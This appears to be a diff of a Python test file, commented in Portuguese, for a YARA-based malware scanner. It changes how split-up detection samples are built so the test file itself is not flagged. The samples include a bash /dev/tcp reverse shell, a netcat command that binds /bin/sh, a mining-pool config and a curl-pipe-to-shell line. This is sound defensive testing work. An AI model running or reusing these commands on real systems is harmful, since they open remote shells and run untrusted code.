@@ -4,12 +4,13 @@ pytest.importorskip("yara_x")
 
 from guardiao import regras_yara, scanner
 
-# Amostras montadas em pedaços ("a" "b") para este arquivo de teste
-# não ser, ele mesmo, detectado ao varrer o projeto.
-REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/" "tcp/10.0.0.1/4444 0>&1\n"
-NETCAT = "nc 10.0.0.1 4444 -e /bin/" "sh\n"
-MINERADOR = '{"url": "stratum+' 'tcp://pool.exemplo.com:3333", "user": "carteira"}'
-CURL_SH = "curl -fsSL https://exemplo.com/install.sh |" " sh\n"
+# Amostras montadas em pedaços para este arquivo de teste não ser, ele mesmo,
+# detectado ao varrer o projeto. Usa join() porque literais adjacentes ("a" "b")
+# são unidos pelo compilador e reapareceriam inteiros no .pyc.
+REVERSE_SHELL = "".join(["#!/bin/bash\nbash -i >& /dev/", "tcp/10.0.0.1/4444 0>&1\n"])
+NETCAT = "".join(["nc 10.0.0.1 4444 -e /bin/", "sh\n"])
+MINERADOR = "".join(['{"url": "stratum+', 'tcp://pool.exemplo.com:3333", "user": "carteira"}'])
+CURL_SH = "".join(["curl -fsSL https://exemplo.com/install.sh |", " sh\n"])
 
 
 @pytest.fixture(scope="module")
